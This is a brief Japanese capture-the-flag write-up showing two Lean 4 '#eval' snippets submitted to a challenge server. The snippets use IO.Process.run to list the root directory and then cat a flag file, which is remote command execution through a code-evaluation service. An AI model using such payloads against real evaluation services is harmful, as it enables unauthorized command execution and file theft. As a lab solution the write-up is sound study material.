まずはファイル名を確認する。以下のものを送信し、`/`にあるファイル名を確認する。

```
#eval show IO Unit from do
  let out ← IO.Process.run { cmd := "ls", args := #["/"] }
  IO.println out
```

フラグのファイル名が分かったらその内容を確認するために、以下のコードを送信する。

```
#eval show IO Unit from do
  let out ← IO.Process.run { cmd := "cat", args := #["/flag-<md5hash>.txt"] }
  IO.println out
```